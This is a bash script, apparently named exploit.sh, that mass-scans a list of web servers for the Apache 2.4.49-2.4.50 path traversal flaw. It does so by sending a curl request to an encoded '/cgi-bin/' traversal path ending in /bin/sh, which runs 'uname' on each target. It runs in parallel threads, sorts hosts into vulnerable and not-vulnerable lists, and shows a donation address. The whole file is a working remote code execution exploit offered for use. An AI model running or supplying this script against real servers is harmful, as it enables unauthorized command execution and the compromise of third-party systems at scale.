#!/bin/bash
# Apache 2.4.49-2.4.50 Vulnerability Checker
# Created By Im-Hanzou
# Using GNU Parallel
# Usage: bash exploit.sh list.txt thread 

yellow='\033[0;33m'
cat << "EOF"
    ___                     __       
   /   |  ____  ____ ______/ /_  ___ 
  / /| | / __ \/ __ `/ ___/ __ \/ _ \
 / ___ |/ /_/ / /_/ / /__/ / / /  __/
/_/  |_/ .___/\__,_/\___/_/ /_/\___/ 
      /_/                            
EOF
printf "     Mass Vulnerability Checker\n\n"
printf "${yellow}Created By Im-Hanzou
Github : im-hanzou
Donate BTC : 1KW2RmVwjEF99TFptRH7mABykGYgX2iuSP\n\n"


exploit(){	
classic='\033[0m'
red='\e[41m'
green='\e[42m'
target=$1
thread=$2

if [[ $(curl -s -d "echo Content-Type: text/plain; echo; uname" --connect-timeout 10 --max-time 10 --insecure $target'/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh') =~ 'Linux' ]]; 
then
    printf "${green}[ Vuln ]${classic} => [$target] \n";
    echo "$target" >> vuln.txt
    else
    printf "${red}[ Not Vuln ]${classic} => $target \n";
    echo "$target" >> notvuln.txt
fi
}

export -f exploit
parallel -j $2 exploit :::: $1 

total=$(cat vuln.txt | wc -l)
totalb=$(cat notvuln.txt | wc -l)
printf "\033[0;36mTotal Vuln : $total\n";
printf "\033[0;36mTotal Not Vuln : $totalb\n";
